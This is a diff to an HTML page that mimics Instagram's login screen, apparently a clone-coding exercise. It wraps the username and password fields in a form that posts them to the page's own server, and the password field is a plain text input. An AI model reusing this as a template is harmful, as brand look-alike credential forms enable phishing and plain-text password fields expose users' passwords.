@@ -23,26 +23,26 @@
                             <img src="instagram-pic\instagram-logo.png" style="width:175px; height:51px">
                         </div>
                         <!-- id -->
-                            
-                        <div class="idpw_1" style="margin-top:24px">
-                            <input type="text" class="idpw_2" placeholder="Phone number, username, or email"
-                            id="user_id"
-                            onkeyup="idpw_input()">
-                        </div>
+                        <form name = "sign_in_data" action="/" method="post">
+                            <div class="idpw_1" style="margin-top:24px">
+                                <input name = "sign_in_id" type="text" class="idpw_2" placeholder="Phone number, username, or email"
+                                id="user_id"
+                                onkeyup="idpw_input()">
+                            </div>
 
-                        <!-- password -->
-                        <div class="idpw_1">
-                            <input type="text" class="idpw_2" placeholder="Password"
-                            id="user_pw"
-                            onkeyup="idpw_input()">
-                        </div>
-                            <!-- login-button -->
-                        <div>
-                            <button class="login-button" id="login-button">
-                                <div style="color:white">Log in</div>
-                            </button>
-                        </div>
-
+                            <!-- password -->
+                            <div class="idpw_1">
+                                <input name = "sign_in_pw" type="text" class="idpw_2" placeholder="Password"
+                                id="user_pw"
+                                onkeyup="idpw_input()">
+                            </div>
+                                <!-- login-button -->
+                            <div>
+                                <button class="login-button" id="login-button">
+                                    <div style="color:white">Log in</div>
+                                </button>
+                            </div>
+                        </form>
                         <div style="margin-top:10px; margin-bottom:18px">
                             <hr class="or-line" color="#dbdbdb" size="1">
                             <span style="font-size:13px; margin-left:12px; margin-right:12px">OR</span>
